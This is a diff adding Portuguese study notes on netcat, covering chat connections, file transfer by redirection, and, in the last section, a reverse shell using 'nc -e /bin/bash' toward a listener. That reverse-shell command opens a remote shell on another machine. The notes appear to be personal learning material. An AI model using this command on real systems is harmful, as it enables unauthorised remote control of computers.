@@ -1,0 +1,38 @@
+NETCAT
+
+-> conhecido como o canivete suíço de redes
+-> usado para a transferencia de dados entre computadores em uma rede através do próprio terminal
+    -> transferência de arquivos
+    -> bate papo em voz sobre IP
+    -> troca de mensagens
+
+____________________________________________________________________________________________________________________________________________
+
+SE CONECTANDO COM ALGUÉM QUE ESTÁ NA MESMA REDE QUE VOCÊ OU NÃO
+
+-> NA MESMA REDE:
+    -> é seguro
+    -> é permitido pelo roteador
+
+    pessoa 1: nc -lvp 9000 (vai ficar escutando através dessa porta)
+    pessoa 2: nc 127.0.0.1 9000 (passa o end. de IP do outro computador e vai até essa porta desse computador)
+
+____________________________________________________________________________________________________________________________________________
+
+TRANSFERENCIA DE ARQUIVOS
+
+-> nc -lvp 9000 > arquivo.txt
+    -> escutando na porta 9000 (esperando alguem se conectar a essa porta usando o meu ip) e tudo o que for trocado, será enviado para esse
+    arquivo.txt
+-> nc 127.0.0.1 9000 < transferencia.txt
+    -> me conectei a esse IP, fui na porta 9000, tem outra pessoa escutando lá e enviei essa transferencia.txt (que vai ser salvo no arquivo.txt)
+
+____________________________________________________________________________________________________________________________________________
+
+SHELL REVERSA COM NETCAT
+
+-> basicamente, é comandar um terminal de outro computador pela conexão com netcat
+
+-> nc -lvp 9000
+-> nc -e /bin/bash 255.255.255.255 9000 (pessoa está indo escutar)
+    -> -e de executar e /bin/bash é o caminho do terminal
